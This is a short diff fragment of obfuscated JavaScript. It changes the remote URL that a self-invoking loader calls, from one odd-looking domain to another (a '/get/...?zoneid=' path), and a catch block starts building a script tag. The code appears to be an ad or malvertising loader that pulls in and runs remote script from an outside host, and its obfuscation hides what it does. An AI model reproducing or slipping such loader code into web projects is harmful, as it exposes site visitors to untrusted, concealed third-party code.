@@ -3516,7 +3516,7 @@ try {
             l3 = v3 && v3[+r8G.U4G(N3R)];
             return l3 !== r8G.U4G(v2R);
         }
-    })('https:choconart.com/get/1818734?zoneid=1818734');
+    })('https://glassmilheart.com/get/1818734?zoneid=1818734');
 } catch (e) {
     function handleException(e) {
         var tag = document.createElement('script');
